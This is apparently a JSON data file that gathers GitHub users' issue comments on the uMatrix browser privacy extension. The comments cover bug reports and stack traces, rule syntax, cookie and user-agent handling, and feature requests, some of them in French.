    "excalibur1234": "these are great news!\nthank you very much.\n. sorry. i forgot about that.\nhere is the log: http://pastebin.com/9qD8yJxK\n. thanks a lot! it works now.\nfor everybody having the same problem, here a short guide how to solve it. this is not an intuitive solution and i would never have figured it out by myself\n- go to https://github.com/gorhill/uMatrix/releases and start to download a .xpi add-on file for firefox.\n- completely whitelisting the page is useless. you will not be able to download the .xpi file: http://imagizer.imageshack.com/img633/6849/53XWOQ.png\n- solution: you need to whitelist at least the \"other\" in \"s3.amazonaws.com\" globally, despite umatrix not showing any blocked content: http://imagizer.imageshack.com/img910/8272/eQIMvO.png\n. your solution probably works with firefox 39 and lower (i have not tested this).\ni am using firefox 40. it does not work, because it wants to verify the download first.\ni think it is has to do something with these new features of firefox 40:\nhttps://wiki.mozilla.org/Addons/Extension_Signing\nhttps://wiki.mozilla.org/Electrolysis\nmy solution works for firefox 40, too. it is not perfect at all, but it works at the moment:\n* s3.amazonaws.com other allow\nbut this problem is probably way off topic. open another issue, if you think so, too.\n. ",
    "githubdbes1": "mailinglists35 commented on Mar 28:\n\"when uMatrix comes to firefox, it will be a hard\ntime to choose between chrome and firefox.\"\n.\nUnfortunately it won't.  uMatrix is the No. 2 browser add-on.  No. 2 in no way diminishes uMatrix's awesomeness.  I won't run my browser without it.  Thank you gorhill!\n.\nHowever, there is another . . . browser add-on that (for folks who have at least started to master it) will keep you nailed to Chromium (Yes, it is a cross (no offense to Christians) due to some bitch dev decisions.  Lest you think I'm biased, some Firefox devs score a close second in the bitch category.).\n.\nI might be about to make your switch to Firefox more difficult.\n.\n.\nDrumroll . . .\n.\n.\nThe No. 1 browser add-on (which is not yet cross-platform) is:\n.\n.\n.\n.\n.\nTabs Outliner\nhttps://chrome.google.com/webstore/detail/tabs-outliner/eggkanocgddhmamlbiijnphhppkpkmkl\n.\n.\nIf you let it, this add-on will revolutionize how you use a web browser.\n.\n.\n(And before you prematurely dismiss my contention that Tabs Outliner is the No. 1 add-on as false, consider for a moment that I breathe the same rarefied air as the other 0.0003% (yes, I did the calculation) of advanced Firefox users who use the Firefox uMatrix add-on (along with some other credentials).)\n.\n.\nSo check out Tabs Outliner.  I didn't write all of the above for my own benefit.\n.\n.\nNamaste,\ndavid\n.\n. ",
    "gerg5c42g542g2c54g52c": "@gorhill is this the recommended way? If one wants to only allow some specific absolutely required scripts coming from a certain domain then one has to use two addons uMatrix and uBlock Origin and set a whitelist rule in uBlock?\nHave you thought of adding these few features (granular script blocking, XSS protection, only allow https) that force people to use many addons instead of just uMatrix? It seems completely pointless and insecure to have X addons that all do very similar things.. That requires installing two addons for one thing, increases attack surface etc. Why not make one addon that does all an advanced user may need? It's just a matter of adding few small features to uMatrix for it to become one.\nBesides, @CrisBRM is there a way to whitelist a specific url in uBlock used in conjunction with uMatrix? I don't like blacklists.. ",
    "SMUsamaShah": "No I wouldn't. Asking is always easier, e.g. stackoverflow is there. I didn't call myself advanced to hurt someone's feelings but to ask if they are only for different users. Developer can suggest the best combination of the three or the one to choose among three.\n. Thanks for explanation. I am using uBlock because it is lighter than all other ad/crap blocking extensions and does not let me wait. uMatrix is great. There should be a benchmark of uMatrix and uMatrix+uBlock as well.\n. ",
    "Nocturnalizer": "Just to provide some additional information, after more testing I've noticed that the memory usage seems to climb up and up if I've adjusted some rules and then I reload the page. It seems like memory will continue to rise as I adjust and then reload. If I start Chrome and just browse without even touching uMatrix memory usage seems to stay relatively low and consistent but it's the actual adjustment of rules followed by reloads that seems to bring the memory up and up.\n. I'm glad I was able to bring it to your attention at least! It does sound like a serious issue. I've never really looked for it with other extensions. It'd be interesting to see if the issue does occur with uBlock too (and those other extensions mentioned above). \nUpdate: Yes, the same seems to happen when opening the uBlock UI over and over again. \n. I hope they get around to looking at it soon. I've starred the bug in the meantime. Thanks for looking into this so quickly.\n. Perhaps it's worth also posting about it on Wilders Security and a few other places? \n. ",
    "muse03": "This bug is non-existent on alt Chromium browsers Slimjet [Chromium version 40] and Opera 28 [Chromium version 41]. \n. My mistake, Slimjet has an memory optimization setting which perhaps caused the low memory usage:\n\n. ",
    "lawrencehartkog": "Related:\nGet permanent cookie, \u00b5Matrix flag \"Delete blocked cookies\" set, allow it in \u00b5Matrix.\nDisallow it in \u00b5Matrix, save settings. No cookie visible to site.\nAllow it in \u00b5Matrix, save settings. Old cookie visible to site.\nI vote for the cookie being deleted with the Disallow-save above (at least if possible with current API).\n. Thank you very much for the detailed explanation.\nAt first sight, as always...\nPerhaps a little handy button for immediately deleting all \ncached data for some domain can be done with the Chrome API.\n. ",
    "acrobat1": "I'm chiming in here (even if I have to made it clear in advance that I certainly don't have the technical expertise to fully understand the matter, sorry for that) to express my doubts about how uMatrix currently handles cookies - to reiterate, I may not be really understanding what is going on here, so please feel free to elucidate.\nWhat seems to be missing at the moment is a fine-grained per-site cookie management, which on the other hand you have made it clear here not being your goal: \n\nI do not intend to turn uMatrix into a full blown cookie manager. There are specialized extensions out there for this.\n\nBut then, in this other issue you explained that \n\ncookies can be set through javascript: there is no way to block the creation of cookies\n\nso are in your opinion other specific cookie management extension actually able to handle all kind of cookies, including the ones you point out above ?\nI've indeed used  some of these specific cookie manager extensions long with uMatrix, and I've sometimes noted that the logger sees cookies even after they should have been blocked/deleted according to the cookie management extension : is that the case you are referring to in the comment that I've quoted above?\nWhat I'd like to understand is whether the kind of control outlined  here, which traditional cookie management extensions seem to offer, is actually possible or if it just looks like  you are totally controlling cookies, while in fact they sometimes cannot be really deleted at your discretion (once you have allowed them) .\nIf that's the case, can uMatrix do better with some combination of already available setting, or are you planning to add something to handle all the storage methods that cookies can now take advantage of, and that probably Firefox itself isn't handling really well at the moment?\n. Thanks for explaining that: I'm sorry for having opened this issue based on just what I saw by looking at about:support.\nIt is true that websites read the proper user agent string once this option is enabled, even if nothing is changing visually in about:support.\nI can see that your extensions may be somehow different from average ones, as they actually do something even when it looks like they aren't.\n. By any chance, could this be somehow related to what I've tried to describe here\n\nI've indeed used some of these specific cookie manager extensions along with uMatrix, and I've sometimes noted that the (uMatrix) logger sees cookies even after they should have been blocked/deleted according to the cookie management extension\n\nor is this something else entirely?\n. Well I reckon it looks like that and I apologize for that matter, however that's really all I have for now: I've been using basic troubleshooting practices such as selectively disable addons, start in safe mode, try different versions of the browser and that's all I can say for now.\nIt's not like I've not been trying and putting some time in it, unfortunately that's all my limited knowledge allows me to do: I can say for sure that with the same combination of addons Firefox 44 doesn't crash on exit whilst Firefox 45 does, and Umatrix along with SessionManager seems involved in this - but I could be wrong, of course.\nI'm not pretending a solution, if there's anything else that I can do, like maybe running Firefox from a terminal with some specific debugging variables, I'll do it.\n. Yes, I've read some of the  bugs you've linked above: definitely looks like the issue I'm talking about.\nOnce again, apologies for pointing towards uMatrix, I was tricked into thinking it possibly was uMatrix fault because, as I've said, for some reason disabling it apparently cured the issue.\nOTOH, I kinda assumed that such a bug wouldn't have gone trough all these beta releases uncaught (and it's still happening in the current beta as I'm writing this) : so I \nwas lead to believe it had to be some weird addon compatibility issue.\n. So this is basically hopeless for the time being, meaning that as we speak neither uMatrix , or some specific user-agent extension (or maybe a combination of both) can successfully spoof the real user agent in some circumstances ? Not even limiting it to just the browser version ?\nAs a side note, does this kind of detection on iFrames still need javascript enabled to work, or is it always effective regardless?\n. ",
    "migueldemoura": "Regarding Local Storage on Chromium:\nBeen almost 6 years since this was reported here. Likely never going to happen.. In uBO:\n||http://*$script,important. Typo on the double |, sorry. Didn't know you could omit the * in that case though. Thanks!\nThe toggle would be useful, but since you can do this with uBO pretty easily, I would say this is low-prio. You can even add an entry to the uBO's wiki with this snippet.. @gorhill, sorry to revive this, but what are your thoughts on redirecting such http requests to https instead of blocking them? I can see an obstacle with this, as some sites redirect back to http, but it would address OP's annoying issue.\nDoes something like this require a considerable change on the arquitecture?. @Tronic69 \n\nRedirections have to be done on server side and not on clients.\n\nWhy? Ideally, all web services would be served as https only, and redirect http to https. While I agree it should be the job of sys admins to ensure this, you can't really rely on it. After all, browsers interpret malformed html syntax for this same reason. The server provides access to content; the client chooses how to display it - the entire premisse of uBlock and uMatrix.\n\nI never saw a server redirecting https to http (only http to https, like I do it for all requests on my servers)\n\nIf you don't support https, it is wise to perform such redirect to reduce bounces. This is easily observed in the wild on, for example:\nhttps://www.huffingtonpost.co.uk\n\nif you do this on a client you will get just 404s for you client side redirections (IMHO in at least 95% of requests)\n\nSetting aside that such percentage is likey overblown, how is that worse than what you have now? If the resource doesn't have a https version, it isn't displayed like with the current implementation. If it does, you now have a less or non-broken website.\nThe only issue I see with this suggestion is potentially increasing complexity. Other than that, I believe it is reasonable, isn't feature creep and addresses a real issue.\n. Assuming that example.com is blocked through a host rule:\nexample.com example.com * allow -> overrides host rule;\nexample.com * * allow -> host rule prevails.\nEdit: * * * allow overrides host rules.. @rekixex, that use case is valid but not common because hosts that you manually whitelist are unlikely to become malicious - they could become sources of tracking scripts, but not malware - sysadmins are likely to find that out before list maintainers do (and the update cron is triggered). And if you whitelisted such host for that service before, you did so because it was probably needed for the page to display properly and you checked what it was for (uMatrix is for advanced users).\nFinally, you can do fine-grained control over what loads by coupling uMatrix and uBO simply by denying all scripts from that host and manually allowing the ones you want.. Can confirm both issues.\nCan reproduce the cell not responding issue - just open a new page and then uMatrix. Clicking the uMatrix icon again fixes it.\nCan't reproduce the other one :disappointed: \nChrome 57\nbuntu 16.10 x64\nuMatrix 0.9.3.6. When navigating the settings page of uMatrix, you can click the link to get more information regarding the \"block all hyperlink auditing attempts\".\nThat link seems outdated though, but such info can be found here: https://html.spec.whatwg.org/multipage/links.html#hyperlink-auditing\nuMatrix doesn't \"clean\" urls, it simply allows you filter requests. You may to keep those extensions if you find they add some value and are appropriate for your threat model.. ",
    "bakaonto": "Thanks, I never thought that it would be configured on the browser side.\nClosing this.\n. ",
    "binarious": "Only Activate the extension works for me. Any idea? \n. ",
    "drivencompassion": "Looking forward to Firefox getting some keyboard shortcut love <3\n. Looking forward to Firefox getting some keyboard shortcut love <3\n. Looking forward to Firefox getting some keyboard shortcut love <3\n. ",
    "PunKeel": "Adf.ly allows one to have 123123123 equals to \"http://something.org/...\", in which case \"example.com\" is appended.\nSo this would not work as expected, I think.\n. ",
    "softwarestake": "thanks for sharing but m finding adfly bypass api find all over internet but did not found -_- \n. ",
    "m-j-r": "I kind of agree with this request - what I would like is to be able to right-click on a item in the matrix and select 'block globally' or 'allow globally', not affecting the 2 options currently available to modify the the current scope.\nA particular example would be to allow script requests from jquery.com\n. Hi, Thanks for the info on switches, but I was asking what @CrisBRM spoke about - a per site UA string. My company's mail only works for FF, a different internal system rejects all non IE UAs, etc, etc. Is this something I can help you work on?\nThanks,\nMatt\nPS I don't always have internet access over the weekend, so in future might need until a Monday morning to reply... \n. Wow, there is no need to get your knickers in a twist. All I was asking for\nwas pointers to the right place in your code (as I said in my mail on\nFriday), and maybe some suggestions for solutions (a lot of people won't\naccept pull-requests for reasons of style, or the design conflicts with\nother plans, etc). I am more than happy to do it myself (as I also said in\nmy mail on Friday).\nIn the meantime, I've read the chrome extension API, have forked your repo,\nand have worked out what and I want to change - so please feel free to\ncontinue ignoring this request, but as a favour to me, please try to relax\na bit.\nCheers,\nMatt\nOn 19 January 2015 at 15:02, Raymond Hill notifications@github.com wrote:\n\nMy company's mail only works for FF ... I can help you work on?\nFrankly, it's such a specific and narrow case, it's starting to look like\na job for a programmer for hire, and you have in mind I will code it\nvoluntarily for you.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/105#issuecomment-70489109.\n. Ok, I've read your comments, and you have persuaded me. The more I think about it, the more I realize that the feature I asked for doesn't fit the 'purpose' of uMatrix.\n\nHaving said that, I love the way uMatrix has been implemented, and can see it becoming more than it is now (I may be the only one to use it..., but), I love the matrix idea, and can see it being a nice 'one-stop-shop' for all your(my) automatic header 'fiddling' (or request blocking) needs. Then again, I can have a habit of over-engineering...\nThanks for responding to my request, and for explaining your reasoning - I genuinely appreciate that.\nPlease feel free to let me know if there is some development that I can help with (I quite enjoyed going through the source).  I do have one more feature request that you'll see soon - maybe you'll let me look into that one.... ;)\n. Hi @gorhill - I've written some of this up, and have it tentatively working for my configs, but I noticed that you had some code to cope with 'legacy' settings options - do you have a set of config files that I can use for testing?\nThanks,\nMatt\n. ",
    "sogen": "+1, how do I whitelist jquery.com??\n. Thanks!\nOn Sun, Mar 8, 2015 at 8:25 AM, Raymond Hill notifications@github.com\nwrote:\n\n\njquery.com * allow\n\nFrom the UI, you have to select global scope *, then allow jquery.com\ndomain, then persist rule by clicking on padlock.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/87#issuecomment-77755375.\n. \n",
    "wfdd": "Wow, ok, there's a lot of stuff that gets (mis-?)categorised as 'behind the scenes'. I guess I'll enable the matrix for behind-the-scene but let all XHRs through, 'cause I don't wanna have to whitelist all extensions and filter lists. Cheers!\n. Does this work across browser sessions? I've found myself in hostname-level scope enough times to know it wasn't my doing.\n. > So it comes down to: what was the hostname of the page you visited when you thought uMatrix lost your setting?\nWell, the latest one was the Guardian, at www.theguardian.com. Might it have something to do with bare domain redirects?\n. This does not only happen in Firefox and is related to the new origin logic in 2224ece (lines 259\u2013272). Chromium spits out the following error:\n\nXMLHttpRequest cannot load https://r4---sn-jtu5-aj5e.googlevideo.com/[..]. The 'Access-Control-Allow-Origin' header has a value 'https://r4---sn-jtu5-aj5e.googlevideo.com' that is not equal to the supplied origin. Origin 'https://www.youtube.com' is therefore not allowed access.\n\nI've not studied the code especially fastidiously, but\u2014evidently\u2014uMatrix sets the value of origin to the host name of the very first origin (which, presumably, is unintentional; if we're to avoid leaking the origin, it should be set to the host name of the target).\n. Ok, if I'm understanding this correctly, googlevideo.com dynamically sets the value of Access-Control-Allow-Origin to the value of the supplied Origin (googlevideo.com, in this particular instance); however, the browser rejects to fulfil the request in the knowledge that it actually originated from YouTube. Given that CORS is an important security feature, it seems rather unlikely that we might be able to override this behaviour.\nThank you for your patience in dealing with this issue.\n. ",
    "requiredregistration": "Chromium    41.0.2245.0 (Developer Build) \nRevision    af82b216b03d8b2e0b6e04b5957ba6f7fd29947c-refs/heads/master@{#307638}\nOS  Windows\n. Error in event handler for webRequest.onBeforeRequest/1: TypeError: Cannot read property 'pageHostname' of undefined\nContext: background.html\nstack trace:\n```\njs/traffic.js:220 (\u00b5Matrix.webRequest.onBeforeRootFrameRequestHandler)\nvar block = \u00b5m.mustBlock(pageStore.pageHostname, requestHostname, 'doc');\njs/traffic.js:279 (\u00b5Matrix.webRequest.onBeforeRequestHandler)\nreturn onBeforeRootFrameRequestHandler(details);\n```\n-===-\nError in event handler for (unknown): TypeError: Cannot read property 'temporary' of undefined\nContext: popup.html\nstack trace:\n```\njs/popup.js:263 (getTemporaryColor)\nreturn matrixSnapshot.rows[hostname].temporary[matrixSnapshot.headers[type]];\njs/popup.js:271 (getCellClass)\nreturn 't' + getTemporaryColor(hostname, type).toString(16) +\njs/popup.js:344 (updateMatrixColors)\ncell.className = 'matCell ' + getCellClass(cell.hostname, cell.reqType);\njs/popup.js:108 (snapshotReady)\nupdateMatrixColors();\njs/popup.js:1184 (snapshotReceived)\ncallback();\njs/messaging-client.js:69 (onPortMessage)\ncallback(details.msg);\n```\n. The specified value '#c00' does not conform to the required format. The format is '#rrggbb' where rr, gg, bb are two-digit hexadecimal numbers.\nContext: dashboard.html\nstack trace:\n```\nsettings.html:52 (anonymous function)\n \n```\n. Chromium    41.0.2266.0 (Developer Build) \nRevision    a36a942330ed2bf0efef3420ca73bac0dbb94ee5-refs/heads/master@{#309883}\n. Error in event handler for (unknown): TypeError: Cannot set property 'textContent' of undefined\nContext: popup.html\nStack Trace:\n```\njs/popup.js:538 (renderMatrixCellDomain)\ncontents.nodeAt(0).textContent = domain === '1st-party' ?\njs/popup.js:592 (makeMatrixRowDomain)\nrenderMatrixCellDomain(cells.at(0), domain);\njs/popup.js:700 (makeMatrixGroup0SectionDomain)\nreturn makeMatrixRowDomain('1st-party').addClass('g0 l1');\njs/popup.js:705 (makeMatrixGroup0Section)\nmakeMatrixGroup0SectionDomain().appendTo(domainDiv);\njs/popup.js:716 (makeMatrixGroup0)\nmakeMatrixGroup0Section().appendTo(groupDiv);\njs/popup.js:927 (makeMenu)\nmakeMatrixGroup0(groupStats[0]);\njs/popup.js:1184 (snapshotReceived)\ncallback();\njs/messaging-client.js:69 (onPortMessage)\ncallback(details.msg);\n```\n\nError in event handler for (unknown): TypeError: Cannot set property 'textContent' of undefined\nContext: popup.html\nStack Trace:\n```\njs/popup.js:558 (renderMatrixMetaCellDomain)\ncontents.nodeAt(0).textContent = '\\u2217.' + punycode.toUnicode(domain);\njs/popup.js:608 (makeMatrixMetaRowDomain)\nrenderMatrixMetaCellDomain(cells.at(0), domain);\njs/popup.js:829 (makeMatrixGroup3SectionMetaDomain)\nreturn makeMatrixMetaRowDomain(domain).addClass('g3 l1 meta');\njs/popup.js:838 (makeMatrixGroup3Section)\nmakeMatrixGroup3SectionMetaDomain(domain).appendTo(domainDiv);\njs/popup.js:854 (makeMatrixGroup3)\nmakeMatrixGroup3Section(Object.keys(group[domains[0]]).sort(hostnameCompare))\njs/popup.js:930 (makeMenu)\nmakeMatrixGroup3(groupStats[3]);\njs/popup.js:1184 (snapshotReceived)\ncallback();\njs/messaging-client.js:69 (onPortMessage)\ncallback(details.msg);\n```\n. Error in event handler for (unknown): TypeError: Cannot read property 'id' of undefined\nContext: background.html\n```\njs/messaging-handlers.js:292 (contentScriptSummaryHandler)\nvar pageURL = \u00b5m.pageUrlFromTabId(sender.tab.id);\n\njs/messaging-handlers.js:375 (onMessage)\n        contentScriptSummaryHandler(request, sender);\n\njs/messaging.js:122 (\u00b5Matrix.messaging.onMessage)\n    listener(request.msg, port.sender, nullFunc);\n\n```\n. disabling behind-the-scenes requests breaks nothing. it works as expected. another thing that is expected is for users to RTFM.\n. steps to reproduce, allow only css, image, and script, the video file will be requested and it will start playback as it is downloaded\nwith wikipedia, again allow only css, image, and script, clicking in the search bar and typing for the incremental search should log XHR requests and they should be blocked, they are sent as if the user has permitted that\n. this is what broke it,\nto prevent uMatrix from connecting to github, i changed the below in background.js:\nprojectServerRoot: 'https://raw.githubusercontent.com/gorhill/umatrix/master/',\nto\nprojectServerRoot: '',\nand it resulted to those problems\n. @gorhill, it should be possible to use uMatrix without requiring a connection to github\n. all right\n. i was planning to create an issue for this, many \"Connecting...\"\n. when \"Prefetch resources to load pages more quickly\" is enabled, it causes the above issue\nwhen it is disabled, it behaves as in firefox\n. i didn't enable the option and i always have it disabled, it is enabled by default for new users\ni came across this issue when i ran chrome as a new user, without going to the settings first, i installed and configured umatrix, and i saw that connections to google servers were being opened when reloading\nwhen i learned that it was the option that caused the issue, i closed the issue here, but i reopened it because i didn't know if you were aware of the issue and if you were planning to address the issue if it was possible to address it\nthe requests that are sent by the resource prefetcher are not logged\n. the setting is Prefetch resources to load pages more quickly, as i mentioned in the first comment\nwhen that is enabled, the requests to fonts.googleapis.com bypass umatrix, and i can see the google connections at chrome://net-internals/#events and with network analysis tools\nin the umatrix logger it shows that the request was blocked, but that is false\n. here are the differences:\nChrome\n\nChromium\n\nthank you\n. ff 39\nhttps-strict: * true\n* * * block\n* * frame block\nwithout cookie\n\nwith cookie\n\nin ff the logger logs nothing for a cookie, in chrom* it is logged and counted (i see daemon-tools.cc/{session-cookie:PHPSESSID} too)\n. with a new profile it works\n. i see 6 repeats of Security Error: Content at moz-nullprincipal:{6bf6068e-9197-4847-b709-a07037440a12} may not load or link to chrome://umatrix/content/popup.html. when i reload with the matrix open\n. it wasn't the profile. this happens in private browsing only.\n. then it will be too late. the collection of the data will have taken place. nothing will change the UI, it will be a dashboard.html#settings option for advanced users.\n. piwik.gitlab.com appears ONLY after the script from gitlab.com has ran.\n. you misunderstood.\nthe issue is not about trust, and i am aware of what data can be collected through common web browser usage with and without umatrix.\nthe issue is that it is not possible to allow ONLY gitlab.com because of the inheritance functionality.\nthe capability to disable inheritance would have blocked piwik.gitlab.com by default, and because it is not currently possible to disable it, it is allowed by default. further actions can only be taken after it was allowed at least once for a user who is not aware that a request to piwik.gitlab.com will be sent by reloading after allowing script on gitlab.com.\nit is about making umatrix even more strict. inheritance in these cases can decrease security and can cause more privacy problems.\n. you are still misunderstanding the issue or you are being dishonest now.\ni do not want to block specific scripts. i want an option to disable the vertical inheritance functionality.\nit is not a duplicate. that is why i never said anything about scopes. i am talking about a global option for advanced users, and what i asked for does not require any UI changes.\n. it is about the user having complete matrix control. the vertical inheritance takes away some of that control from the user.\n. ",
    "Snapy": "Peux-tu pr\u00e9ciser le contenu attendu : explication des diff\u00e9rentes fonctionnalit\u00e9s, les diff\u00e9rentes approches possibles (i.e NoScript, bloqueur de pubs), traduction des pages du wiki ?\n. J'ai fait un Google Doc pour t'aider/r\u00e9pondre \u00e0 tes questions.\nPour faire court :\n- \u00b5Matrix est pour des utilisateurs plut\u00f4t avanc\u00e9s\n- Pour YouTube \n  - Tes r\u00e8gles ont juste besoin d'\u00eatre un peu modifi\u00e9es\n  - Certains changements de YouTube peuvent rendre des r\u00e8gles non fonctionnelles. \n- Regarde sur Wikip\u00e9dia (ou d'autres sites) pour les types de requ\u00eates (CSS, script, frames...).\n- Renseigne-toi sur les sites que tu d\u00e9bloques \"au petit bonheur la chance\" \u00e0 moins d'\u00eatre s\u00fbr.\nSi tu as d'autres questions ou besoin de plus de pr\u00e9cisions n'h\u00e9site pas \u00e0 me demander.\nP.S : Lis bien les quelques infos utiles de la fin.\n. Il n'y a pas de grandes difficult\u00e9s \u00e0 apprendre \u00e0 utiliser \u00b5Matrix (documentation + syntaxe + bidouille).\nEn effet, pas beaucoup d'extensions sur Opera mais si tu installes cette extension tu auras acc\u00e8s au catalogue Chrome et donc \u00e0 un plus grand choix (comme ScriptSafe).\nConcernant \u00b5Block (m\u00eame si ce n'est pas l'endroit appropri\u00e9), ce qui est bloqu\u00e9 vient soit des listes, soit des filtres cr\u00e9\u00e9s, soit par le filtrage dynamique. Dans la popup (quand tu cliques sur l\u2019ic\u00f4ne) tu devrais voir un \u0153il : clique et tu pourras voir les \u00e9l\u00e9ments bloqu\u00e9s/bloquables de la page et en bidouillant tu devrais pouvoir t'en sortir.\nSinon je ne vois de quoi tu parles quand tu dis \"activer une IP\"\n. I understand for WOT but checking the security of a site is different from the rating based on a handful of users (those willing to rate). For example VirusTotal uses a lot (~60) of antivirus engines and has no reputation feature.\n. It's normal. gorhill recently changed the minimum Firefox version to 35.0 because of #200 (commit related). I know Icecat follows Firefox ESR for its releases so when it will be on ESR 38 everything should be fine\n. You can still use an older version if it's not too buggy.\n. @castor-troy The short answer is no but when it will be implemented it will be cross-platform.\n. The size of the data transferred is 0 B so it's as good as blocked or am I missing something ?\n. So just to be sure, there is no privacy issue. What is your point in reporting this ?\n. What browser or you using ?\n. You might want trying\nyoutube.com googlevideo.com other allow\nyoutube.com googlevideo.com xhr allow\nWildcards are not supported and SLD are included by default.\n. It's normal : gorhill didn't change the version number but you should have the latest version.\n. Duplicate of #358 (see this comment).\n. There are two aspects about the feature implementation in NoScript : \n- setting up a personal domain & \n- redirecting to 3rd-party servers to check for privacy/security.\nThe first one has already been discussed many times by @gorhill : he doesn't want having to maintain a website (was about uBO and was a couple months ago) because it requires time which he doesn't have as he prefers to focus on coding ; it also costs money for the server/bandwidth and he doesn't want donations (to cover the costs) as it may involve expectations from donators and may make them feel as if gorhill is for hire possibly asking for specific (ie for a handful of users) feature requests.\nThe second aspect would rely on 3rd-party servers (see #185).\n@nazir-cz You can and should keep NS as it offers additional protections (clickjacking, XSS, ABE to name a few) even when you allow all scripts.\n@eromlige You can use FlagFox although it checks only the age domain you can set up more custom tools with keyboard shortcuts.\n. Subdomains are included by default so googlevideo.com is sufficient. Read the doc and search for similar issues next time.\n. Remove matrix-off: localhost true.\n. ",
    "Floruit": "Bonjour et merci de ta r\u00e9ponse , \nPour un utilisateur lambda , je suit vite d\u00e9boussol\u00e9 par ce qu'il faut activer ou non ! le principe en lui m\u00eame est clair ( autorisation ou non avec vert et rouge et sauvegarde  ) mais dans les \" r\u00e8gles\"  par exemple , j'ai suivi le tuto anglais pour auoriser youtube partout , mais a chaque site nouveau il faut que je l'active ainsi que  ymtg ou un truc du genre , donc cela je n'ai pas compris par exemple , aussi je voit a peu pr\u00e8s ce qu'est les CSS , script et frame , mais je pense que d'autre n'ont pas du tout ses notions .... donc expliquer ce qui est utile de d\u00e9bloquer des fois , par exemple sur CCM , le CSS est desctiv\u00e9 par default il faut donc activer le CSS , sur d'autre site , j'y vais parfois au petit bonheur la chance , j'active / desactive les ligne une par une pour trouver ce qui est bloqu\u00e9 :D \n. merci je savait pas pour le premier asterisque . \navec le temps je commence a connaitre certains truc , et maintenant je regarde , ce que les ligne vont me \" d\u00e9bloquer \" ( par exemple si y'a un 1 dans script je sait que cela va activer un script ) . \nje vais me pencher sur la syntaxe aussi :) \nj'avoue ne pas etre un utilisateur confirmer, mais comme \" noscript \" n'existe plus sur op\u00e9ra , c'est la seule alternative que j'ai trouv\u00e9 :D \nautre question : j'ai \u00e9t\u00e9 sur un site pour adulte ( avec un logo de hamster pour les connaisseur :D ), est je suit tomb\u00e9 sur un bloqueur de navigateur  ( j'ai du fermer ce dernier via le gestionnaire ) , pourquoi ublock ne l'a pas bloqu\u00e9/detect\u00e9 ? c'etait au tout d\u00e9but  que j'avais ublock est sur le site j'ai juste activer une IP pour lire la video  ( comme je le fait a chaque fois elle ont toute des ip differente ) \n. \"Sinon je ne vois de quoi tu parles quand tu dis \"activer une IP\"\nen faite , les video du site sont bloqu\u00e9 par d\u00e9fault , pour les lire , faut activer en vert par exemple 100.01.02.03 sur une autre video se sera 101.01..02.03 , etc..... j'apparente cela a une adresse IP , mais je me trompe peut-etre !\n. ",
    "esnellman": "it was a popup to another domain that had a embedded frame.  \nI worked around it by copying popup url and pasting into a new tab, disabling umatrix for that domain and then re-poping up.  \nI am still unsure if umatrix is worth the time to configure.  I am constantly unblocking cdn's  for website to load. \nExamples:\ntry loading: https://www.coursera.org/\ntry clicking the date dropdown on: http://finance.yahoo.com/q/op?s=QQQ+Options\n75% of the sites I use I have to unblock things.  And some of my unblocking rules I will have to update as cdn domains changes.\n. ",
    "theneo9": "Thanks for the explanation. Great work. Thank you.\n. ",
    "Havokdan": "Opera store version is too old...\n. Again...  :D\n. Again..., uBlock is okay, but uMatrix is old...\n. Remove rules (maybe chango allow to deny):\n- 1st-party * allow\n- 1st-party frame allow\n. There should be an option, which came off by default, which auto-reload the page to close the popup of the icon.\n. I am interested in knowing the answers to these questions too, if there are no answers on the wiki, it would be nice to add them later.\n. Maybe this answer: https://github.com/gorhill/httpswitchboard/wiki/The-matrix-cells\n. https://github.com/gorhill/uMatrix/wiki/Very-bare-walkthrough-for-first-time-users\n. Would it not be possible to lock the items in the matrix via logger? I refer to the items individually.As it would not move on the main interface of Umatrix.\n. I think it's a good idea to move still on betas versions, the item referred to above for \"media\".. Could not make both have the same function, at least temporarily, \"media\" and \"plugin\" in the rules, being in the wiki that the ideal would be to use \"media\" from this version onwards?. Maybe: https://github.com/gorhill/uMatrix/wiki/Scope-selector\n?. Me Too. Are viewing one more item as blocked. I'm sorry, I saw what it was in my case.\nWindows 10 x64\nOpera 51 x64\nuMatrix 1.3.4. ",
    "kxpvcr": "I'd love to have it, is there a way to help?\n. It's very possible. And not a deal-breaker :)\n. This is old and closed, but still happening:\n\nFor reference: using Chromium 55.0.2883.75 (64-bit), OSX 10.12.3, uMatrix 0.9.3.6, uBlock 1.9.10.\n. ",
    "kilsey": "Also dying to have this - uBlock isn't quite enough on its own for Safari\n. ",
    "underscorephil": "+1\n. ",
    "caobo": "+1\n. ",
    "AndreasBackx": "@gorhill Any reason why this is declined?\n. I can port it, I was just wondering about the reasoning behind the declined request.\n. ",
    "gaijin42": "Yes, via hover or click. Each cell is already divided into two parts horizontally for white/black listing. Perhaps a small vertical divide on the right side for \"details\"\nSince the information is already in the statistics tab, it seems like filtering that list at the time of click should have negligible performance impact?\nThis could also dovetail nicely into a nice down-the-line feature where once you had the details up, you could easily introduce rules to allow or disallow specific items through that are \"exceptional exceptions\"\nThis feature seems especially relevant in light of the comment on the homepage \"So this means do not file issues to report broken sites when the sites are broken because \u00b5Matrix does its job as expected. I will close any such issue without further comment.\"\nIf you don't want people bugging you about broken sites (very understandable) give them tools to easily unbreak the sites\n. If you don't like the feature, thats ok, its your project. \nBut I'm somewhat confused as to why this would cause you to be at a loss for words. I made a straightforward suggestion to increase the usability of the product, in an area you apparently get enough grief about that you wanted to comment on it on the homepage.\nIf you disagree, or things its a bad ROI, as I said its your project, do what you want. But don't treat me like I'm trolling you please.\n. ",
    "Corrodias": "Yes, I am also blocking the \"other\" type, and that column shows as blank, indicating that \u00b5Matrix didn't catch it trying to load anything.\n. Oh, I see. Thank you.\nI am curious why this is not blocked as a <video> object. Inspecting the page shows that the video data comes in as <video class=\"video-stream html5-main-video\" src=\"blob:(url)\" style=\"width: 640px; height: 360px; left: 0px; top: 0px; transform: none;\"></video>\n. ",
